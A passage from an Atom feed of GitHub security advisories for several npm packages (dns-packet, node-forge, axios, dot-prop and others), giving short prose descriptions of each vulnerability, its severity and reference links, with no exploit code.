<li><a href="https://github.com/advisories/GHSA-92xj-mqp7-vmcj">https://github.com/advisories/GHSA-92xj-mqp7-vmcj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-92xj-mqp7-vmcj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2020-09-14T21:42:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dns-packet] Potential memory exposure in dns-packet]]></title>
        <id>https://github.com/advisories/GHSA-3wcq-x3mq-6r9p</id>
        <link href="https://github.com/advisories/GHSA-3wcq-x3mq-6r9p"/>
        <updated>2025-02-12T05:11:11.000Z</updated>
        <content type="html"><![CDATA[<p>This affects the package dns-packet before versions 1.3.2 and 5.2.2. It creates buffers with allocUnsafe and does not always fill them before forming network packets. This can expose internal application memory over unencrypted network when querying crafted invalid domain names.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23386">https://nvd.nist.gov/vuln/detail/CVE-2021-23386</a></li>
<li><a href="https://github.com/mafintosh/dns-packet/commit/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56">https://github.com/mafintosh/dns-packet/commit/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56</a></li>
<li><a href="https://hackerone.com/bugs?subject=user&amp;amp%3Breport_id=968858">https://hackerone.com/bugs?subject=user&amp;amp%3Breport_id=968858</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1295719">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1295719</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-DNSPACKET-1293563">https://snyk.io/vuln/SNYK-JS-DNSPACKET-1293563</a></li>
<li><a href="https://github.com/mafintosh/dns-packet/commit/0d0d593f8df4e2712c43957a6c62e95047f12b2d">https://github.com/mafintosh/dns-packet/commit/0d0d593f8df4e2712c43957a6c62e95047f12b2d</a></li>
<li><a href="https://github.com/advisories/GHSA-3wcq-x3mq-6r9p">https://github.com/advisories/GHSA-3wcq-x3mq-6r9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wcq-x3mq-6r9p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-05-24T19:51:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansi-html] Uncontrolled Resource Consumption in ansi-html]]></title>
        <id>https://github.com/advisories/GHSA-whgm-jr23-g3j9</id>
        <link href="https://github.com/advisories/GHSA-whgm-jr23-g3j9"/>
        <updated>2025-02-12T05:11:11.000Z</updated>
        <content type="html"><![CDATA[<p>This affects all versions of package ansi-html. If an attacker provides a malicious string, it will get stuck processing the input for an extremely long time.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23424">https://nvd.nist.gov/vuln/detail/CVE-2021-23424</a></li>
<li><a href="https://github.com/Tjatse/ansi-html/issues/19">https://github.com/Tjatse/ansi-html/issues/19</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-ANSIHTML-1296849">https://snyk.io/vuln/SNYK-JS-ANSIHTML-1296849</a></li>
<li><a href="https://github.com/ioet/time-tracker-ui/security/advisories/GHSA-4fjc-8q3h-8r69">https://github.com/ioet/time-tracker-ui/security/advisories/GHSA-4fjc-8q3h-8r69</a></li>
<li><a href="https://github.com/Tjatse/ansi-html/commit/8142b25bca3133ea060bcc1889277dc482327a63">https://github.com/Tjatse/ansi-html/commit/8142b25bca3133ea060bcc1889277dc482327a63</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1567198">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1567198</a></li>
<li><a href="https://github.com/advisories/GHSA-whgm-jr23-g3j9">https://github.com/advisories/GHSA-whgm-jr23-g3j9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-whgm-jr23-g3j9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-09-02T17:15:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dns-packet] Potential memory exposure in dns-packet]]></title>
        <id>https://github.com/advisories/GHSA-3wcq-x3mq-6r9p</id>
        <link href="https://github.com/advisories/GHSA-3wcq-x3mq-6r9p"/>
        <updated>2025-02-12T05:11:11.000Z</updated>
        <content type="html"><![CDATA[<p>This affects the package dns-packet before versions 1.3.2 and 5.2.2. It creates buffers with allocUnsafe and does not always fill them before forming network packets. This can expose internal application memory over unencrypted network when querying crafted invalid domain names.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23386">https://nvd.nist.gov/vuln/detail/CVE-2021-23386</a></li>
<li><a href="https://github.com/mafintosh/dns-packet/commit/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56">https://github.com/mafintosh/dns-packet/commit/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56</a></li>
<li><a href="https://hackerone.com/bugs?subject=user&amp;amp%3Breport_id=968858">https://hackerone.com/bugs?subject=user&amp;amp%3Breport_id=968858</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1295719">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1295719</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-DNSPACKET-1293563">https://snyk.io/vuln/SNYK-JS-DNSPACKET-1293563</a></li>
<li><a href="https://github.com/mafintosh/dns-packet/commit/0d0d593f8df4e2712c43957a6c62e95047f12b2d">https://github.com/mafintosh/dns-packet/commit/0d0d593f8df4e2712c43957a6c62e95047f12b2d</a></li>
<li><a href="https://github.com/advisories/GHSA-3wcq-x3mq-6r9p">https://github.com/advisories/GHSA-3wcq-x3mq-6r9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wcq-x3mq-6r9p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-05-24T19:51:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-forge] Improper Verification of Cryptographic Signature in node-forge]]></title>
        <id>https://github.com/advisories/GHSA-x4jg-mjrx-434g</id>
        <link href="https://github.com/advisories/GHSA-x4jg-mjrx-434g"/>
        <updated>2025-02-12T05:11:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>RSA PKCS#1 v1.5 signature verification code does not check for tailing garbage bytes after decoding a <code>DigestInfo</code> ASN.1 structure. This can allow padding bytes to be removed and garbage data added to forge a signature when a low public exponent is being used.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been addressed in <code>node-forge</code> <code>1.3.0</code>.</p>
<h3 id="references">References</h3>
<p>For more information, please see
<a href="https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/">"Bleichenbacher's RSA signature forgery based on implementation error"</a>
by Hal Finney.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/digitalbazaar/forge">forge</a></li>
<li>Email us at <a href="mailto:security@digitalbazaar.com">example email address</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/digitalbazaar/forge/security/advisories/GHSA-x4jg-mjrx-434g">https://github.com/digitalbazaar/forge/security/advisories/GHSA-x4jg-mjrx-434g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24772">https://nvd.nist.gov/vuln/detail/CVE-2022-24772</a></li>
<li><a href="https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1">https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1</a></li>
<li><a href="https://github.com/digitalbazaar/forge/commit/bb822c02df0b61211836472e29b9790cc541cdb2">https://github.com/digitalbazaar/forge/commit/bb822c02df0b61211836472e29b9790cc541cdb2</a></li>
<li><a href="https://github.com/advisories/GHSA-x4jg-mjrx-434g">https://github.com/advisories/GHSA-x4jg-mjrx-434g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x4jg-mjrx-434g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-03-18T23:10:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-forge] Improper Verification of Cryptographic Signature in node-forge]]></title>
        <id>https://github.com/advisories/GHSA-cfm4-qjh2-4765</id>
        <link href="https://github.com/advisories/GHSA-cfm4-qjh2-4765"/>
        <updated>2025-02-12T05:11:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>RSA PKCS#1 v1.5 signature verification code is lenient in checking the digest algorithm structure. This can allow a crafted structure that steals padding bytes and uses unchecked portion of the PKCS#1 encoded message to forge a signature when a low public exponent is being used.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been addressed in <code>node-forge</code> <code>1.3.0</code>.</p>
<h3 id="references">References</h3>
<p>For more information, please see
<a href="https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/">"Bleichenbacher's RSA signature forgery based on implementation error"</a>
by Hal Finney.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/digitalbazaar/forge">forge</a></li>
<li>Email us at <a href="mailto:security@digitalbazaar.com">example email address</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765">https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24771">https://nvd.nist.gov/vuln/detail/CVE-2022-24771</a></li>
<li><a href="https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1">https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1</a></li>
<li><a href="https://github.com/digitalbazaar/forge/commit/bb822c02df0b61211836472e29b9790cc541cdb2">https://github.com/digitalbazaar/forge/commit/bb822c02df0b61211836472e29b9790cc541cdb2</a></li>
<li><a href="https://github.com/advisories/GHSA-cfm4-qjh2-4765">https://github.com/advisories/GHSA-cfm4-qjh2-4765</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfm4-qjh2-4765</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-03-18T23:09:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[follow-redirects] Exposure of sensitive information in follow-redirects]]></title>
        <id>https://github.com/advisories/GHSA-74fj-2j2h-c42q</id>
        <link href="https://github.com/advisories/GHSA-74fj-2j2h-c42q"/>
        <updated>2025-02-12T05:11:06.000Z</updated>
        <content type="html"><![CDATA[<p>follow-redirects is vulnerable to Exposure of Private Personal Information to an Unauthorized Actor</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0155">https://nvd.nist.gov/vuln/detail/CVE-2022-0155</a></li>
<li><a href="https://github.com/follow-redirects/follow-redirects/commit/8b347cbcef7c7b72a6e9be20f5710c17d6163c22">https://github.com/follow-redirects/follow-redirects/commit/8b347cbcef7c7b72a6e9be20f5710c17d6163c22</a></li>
<li><a href="https://huntr.dev/bounties/fc524e4b-ebb6-427d-ab67-a64181020406">https://huntr.dev/bounties/fc524e4b-ebb6-427d-ab67-a64181020406</a></li>
<li><a href="https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf">https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-74fj-2j2h-c42q">https://github.com/advisories/GHSA-74fj-2j2h-c42q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-74fj-2j2h-c42q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-01-12T22:46:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsoneditor] Regular Expression Denial of Service in jsoneditor]]></title>
        <id>https://github.com/advisories/GHSA-hhfg-6hfc-rvxm</id>
        <link href="https://github.com/advisories/GHSA-hhfg-6hfc-rvxm"/>
        <updated>2025-02-12T05:11:06.000Z</updated>
        <content type="html"><![CDATA[<p>JSON Editor is a web-based tool to view, edit, format, and validate JSON. It has various modes such as a tree editor, a code editor, and a plain text editor. The jsoneditor package is vulnerable to ReDoS (regular expression denial of service). An attacker that is able to provide a crafted element as input to the getInnerText function may cause an application to consume an excessive amount of CPU. Below pinned line using vulnerable regex.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3822">https://nvd.nist.gov/vuln/detail/CVE-2021-3822</a></li>
<li><a href="https://github.com/josdejong/jsoneditor/commit/092e386cf49f2a1450625617da8e0137ed067c3e">https://github.com/josdejong/jsoneditor/commit/092e386cf49f2a1450625617da8e0137ed067c3e</a></li>
<li><a href="https://huntr.dev/bounties/1e3ed803-b7ed-42f1-a4ea-c4c75da9de73">https://huntr.dev/bounties/1e3ed803-b7ed-42f1-a4ea-c4c75da9de73</a></li>
<li><a href="https://github.com/advisories/GHSA-hhfg-6hfc-rvxm">https://github.com/advisories/GHSA-hhfg-6hfc-rvxm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hhfg-6hfc-rvxm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-09-29T17:15:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cryptiles] Insufficient Entropy in cryptiles]]></title>
        <id>https://github.com/advisories/GHSA-rq8g-5pc5-wrhr</id>
        <link href="https://github.com/advisories/GHSA-rq8g-5pc5-wrhr"/>
        <updated>2025-02-12T05:10:56.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of <code>cryptiles</code> prior to 4.1.2 are vulnerable to Insufficient Entropy. The <code>randomDigits()</code> method does not provide sufficient entropy and its generates digits that are not evenly distributed.</p>
<h2 id="recommendation">Recommendation</h2>
<p>Upgrade to version 4.1.2. The package is deprecated and has been moved to <code>@hapi/cryptiles</code> and it is strongly recommended to use the maintained package.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000620">https://nvd.nist.gov/vuln/detail/CVE-2018-1000620</a></li>
<li><a href="https://github.com/hapijs/cryptiles/issues/34">https://github.com/hapijs/cryptiles/issues/34</a></li>
<li><a href="https://github.com/advisories/GHSA-rq8g-5pc5-wrhr">https://github.com/advisories/GHSA-rq8g-5pc5-wrhr</a></li>
<li><a href="https://github.com/nodejs/security-wg/blob/master/vuln/npm/476.json">https://github.com/nodejs/security-wg/blob/master/vuln/npm/476.json</a></li>
<li><a href="https://www.npmjs.com/advisories/720">https://www.npmjs.com/advisories/720</a></li>
<li><a href="https://www.npmjs.com/advisories/1464">https://www.npmjs.com/advisories/1464</a></li>
<li><a href="https://github.com/hapijs/cryptiles/commit/9332d4263a32b84e76bf538d7470d01ea63fa047">https://github.com/hapijs/cryptiles/commit/9332d4263a32b84e76bf538d7470d01ea63fa047</a></li>
<li><a href="https://github.com/hapijs/cryptiles/issues/35">https://github.com/hapijs/cryptiles/issues/35</a></li>
<li><a href="https://github.com/hapijs/cryptiles/commit/6bdcd0f6ee8ade96e7b30350bad39ee0c2ef0f9b">https://github.com/hapijs/cryptiles/commit/6bdcd0f6ee8ade96e7b30350bad39ee0c2ef0f9b</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rq8g-5pc5-wrhr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2018-09-11T18:22:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] axios Inefficient Regular Expression Complexity vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-cph5-m8f7-6c5x</id>
        <link href="https://github.com/advisories/GHSA-cph5-m8f7-6c5x"/>
        <updated>2025-02-12T05:10:46.000Z</updated>
        <content type="html"><![CDATA[<p>axios before v0.21.2 is vulnerable to Inefficient Regular Expression Complexity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3749">https://nvd.nist.gov/vuln/detail/CVE-2021-3749</a></li>
<li><a href="https://github.com/axios/axios/commit/5b457116e31db0e88fede6c428e969e87f290929">https://github.com/axios/axios/commit/5b457116e31db0e88fede6c428e969e87f290929</a></li>
<li><a href="https://huntr.dev/bounties/1e8f07fc-c384-4ff9-8498-0690de2e8c31">https://huntr.dev/bounties/1e8f07fc-c384-4ff9-8498-0690de2e8c31</a></li>
<li><a href="https://www.npmjs.com/package/axios">https://www.npmjs.com/package/axios</a></li>
<li><a href="https://lists.apache.org/thread.html/r075d464dce95cd13c03ff9384658edcccd5ab2983b82bfc72b62bb10@%3Ccommits.druid.apache.org%3E">https://lists.apache.org/thread.html/r075d464dce95cd13c03ff9384658edcccd5ab2983b82bfc72b62bb10@%3Ccommits.druid.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r216f0fd0a3833856d6a6a1fada488cadba45f447d87010024328ccf2@%3Ccommits.druid.apache.org%3E">https://lists.apache.org/thread.html/r216f0fd0a3833856d6a6a1fada488cadba45f447d87010024328ccf2@%3Ccommits.druid.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r3ae6d2654f92c5851bdb73b35e96b0e4e3da39f28ac7a1b15ae3aab8@%3Ccommits.druid.apache.org%3E">https://lists.apache.org/thread.html/r3ae6d2654f92c5851bdb73b35e96b0e4e3da39f28ac7a1b15ae3aab8@%3Ccommits.druid.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r4bf1b32983f50be00f9752214c1b53738b621be1c2b0dbd68c7f2391@%3Ccommits.druid.apache.org%3E">https://lists.apache.org/thread.html/r4bf1b32983f50be00f9752214c1b53738b621be1c2b0dbd68c7f2391@%3Ccommits.druid.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r7324ecc35b8027a51cb6ed629490fcd3b2d7cf01c424746ed5744bf1@%3Ccommits.druid.apache.org%3E">https://lists.apache.org/thread.html/r7324ecc35b8027a51cb6ed629490fcd3b2d7cf01c424746ed5744bf1@%3Ccommits.druid.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r74d0b359408fff31f87445261f0ee13bdfcac7d66f6b8e846face321@%3Ccommits.druid.apache.org%3E">https://lists.apache.org/thread.html/r74d0b359408fff31f87445261f0ee13bdfcac7d66f6b8e846face321@%3Ccommits.druid.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ra15d63c54dc6474b29f72ae4324bcb03038758545b3ab800845de7a1@%3Ccommits.druid.apache.org%3E">https://lists.apache.org/thread.html/ra15d63c54dc6474b29f72ae4324bcb03038758545b3ab800845de7a1@%3Ccommits.druid.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rc263bfc5b53afcb7e849605478d73f5556eb0c00d1f912084e407289@%3Ccommits.druid.apache.org%3E">https://lists.apache.org/thread.html/rc263bfc5b53afcb7e849605478d73f5556eb0c00d1f912084e407289@%3Ccommits.druid.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rfa094029c959da0f7c8cd7dc9c4e59d21b03457bf0cedf6c93e1bb0a@%3Cdev.druid.apache.org%3E">https://lists.apache.org/thread.html/rfa094029c959da0f7c8cd7dc9c4e59d21b03457bf0cedf6c93e1bb0a@%3Cdev.druid.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rfc5c478053ff808671aef170f3d9fc9d05cc1fab8fb64431edc66103@%3Ccommits.druid.apache.org%3E">https://lists.apache.org/thread.html/rfc5c478053ff808671aef170f3d9fc9d05cc1fab8fb64431edc66103@%3Ccommits.druid.apache.org%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2022.html">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>
<li><a href="https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf">https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-cph5-m8f7-6c5x">https://github.com/advisories/GHSA-cph5-m8f7-6c5x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cph5-m8f7-6c5x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-09-01T18:23:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dot-prop] dot-prop Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-ff7x-qrg7-qggm</id>
        <link href="https://github.com/advisories/GHSA-ff7x-qrg7-qggm"/>
        <updated>2025-02-12T05:10:43.000Z</updated>
        <content type="html"><![CDATA[<p>Prototype pollution vulnerability in dot-prop npm package versions before 4.2.1 and versions 5.x before 5.1.1 allows an attacker to add arbitrary properties to JavaScript language constructs such as objects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8116">https://nvd.nist.gov/vuln/detail/CVE-2020-8116</a></li>
<li><a href="https://hackerone.com/reports/719856">https://hackerone.com/reports/719856</a></li>
<li><a href="https://github.com/sindresorhus/dot-prop/issues/63">https://github.com/sindresorhus/dot-prop/issues/63</a></li>
<li><a href="https://github.com/advisories/GHSA-ff7x-qrg7-qggm">https://github.com/advisories/GHSA-ff7x-qrg7-qggm</a></li>
<li><a href="https://github.com/sindresorhus/dot-prop/tree/v4">https://github.com/sindresorhus/dot-prop/tree/v4</a></li>
<li><a href="https://github.com/sindresorhus/dot-prop/commit/3039c8c07f6fdaa8b595ec869ae0895686a7a0f2">https://github.com/sindresorhus/dot-prop/commit/3039c8c07f6fdaa8b595ec869ae0895686a7a0f2</a></li>
<li><a href="https://github.com/sindresorhus/dot-prop/commit/c914124f418f55edea27928e89c94d931babe587">https://github.com/sindresorhus/dot-prop/commit/c914124f418f55edea27928e89c94d931babe587</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ff7x-qrg7-qggm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2020-07-29T20:56:59.000Z</published>
    </entry>
</feed>